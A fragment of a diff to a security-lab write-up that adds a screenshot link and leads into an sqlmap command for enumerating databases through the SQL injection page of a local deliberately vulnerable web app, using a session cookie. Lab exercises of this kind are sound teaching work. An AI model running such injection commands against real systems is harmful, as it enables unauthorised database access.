@@ -136,7 +136,9 @@ http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit.
 **Run sqlmap to enumerate databases:**
 Find PHPSESSID :
 
-<img width="500" alt="Screenshot" src=""><br>
+<img width="500" alt="Screenshot" src="https://github.com/DaronD1709/Information-Security/blob/main/Security_Lab/img/Screenshot%202024-10-21%20at%2011.01.49.png"><br>
+
+Then :
 
 ```
 sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<veum4ka5g5rqc8rcnghg20ch00>; security=low" --dbs
